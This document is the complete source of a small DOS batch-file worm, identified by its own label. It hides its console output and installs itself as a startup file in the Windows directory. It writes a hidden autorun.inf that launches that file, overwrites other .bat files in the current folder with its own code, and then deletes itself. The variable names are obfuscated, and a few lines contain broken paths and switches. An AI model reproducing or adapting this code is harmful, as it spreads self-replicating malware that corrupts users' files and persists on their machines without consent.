   ctty nul %I-Worm.FuckOff%
   :K
   set v2=*.
   set x3=ba
   set kxsup=t
   set !k=%windir%
   deltree \y %!k%\winstart.bat
   if exist c:\autorun.inf goto !xe0n
   echo [AutoRun] > c:\autorun.inf
   echo open=%!k%\winstart.bat > c:utorun.inf
   attrib c:\autorun.inf +h
   if not exist %!k%\winstart.bat copy %0 %!k%
   if exist %!k%\winstart.bat goto :K
   if %v2%==* goto :!xe0n
   for %%z in (%v2%%x3%%kxsup%) do copy /y %0 %%z
   :!xe0n
   deltree /y %0
   ctty con
